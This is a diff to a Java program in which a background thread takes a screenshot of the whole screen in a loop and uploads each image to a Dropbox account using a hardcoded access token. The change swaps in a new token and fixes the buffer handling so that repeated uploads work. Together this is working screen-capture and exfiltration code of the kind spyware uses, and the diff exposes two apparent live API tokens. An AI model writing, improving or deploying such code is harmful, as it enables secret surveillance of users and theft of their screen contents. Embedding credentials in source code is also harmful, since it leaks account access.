@@ -17,7 +17,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 
 public class MainClass {
-    private final String TOKEN = "fl1g8aT4c9AAAAAAAAAAAePmtSfJYGVx15yjkjqkCLvSn6T9_McdOCm_Z1MiL7Tt";
+    private final String TOKEN = "qD5dXi3UxZAAAAAAAAAAAcf2t0uqRthz7juDp4kyYnXeHlMEW8DY2DPENPz92hju";
 
     private Thread objDelay = null;
     private Thread objSender = null;
@@ -62,7 +62,6 @@ public class MainClass {
 
     class SenderClass extends Thread {
         private Thread lifeParent = null;
-
         public SenderClass() {
             lifeParent = Thread.currentThread();
         }
@@ -73,7 +72,7 @@ public class MainClass {
             DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
             DbxClientV2 client = new DbxClientV2(config, TOKEN);
 
-            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            ByteArrayOutputStream outputStream = null;
             InputStream inputStream = null;
             SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
             try {
@@ -86,11 +85,11 @@ public class MainClass {
                     image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                     String data = dateFormat.format(new Date());
 
+                    outputStream = new ByteArrayOutputStream();
                     ImageIO.write(image, "png", outputStream);
                     inputStream = new ByteArrayInputStream(outputStream.toByteArray());
 
                     FileMetadata metadata = client.files().uploadBuilder("/" + data + ".png").uploadAndFinish(inputStream);
-                    metadata = null;
                 }
             } catch (InterruptedException e) {
                 e.printStackTrace();
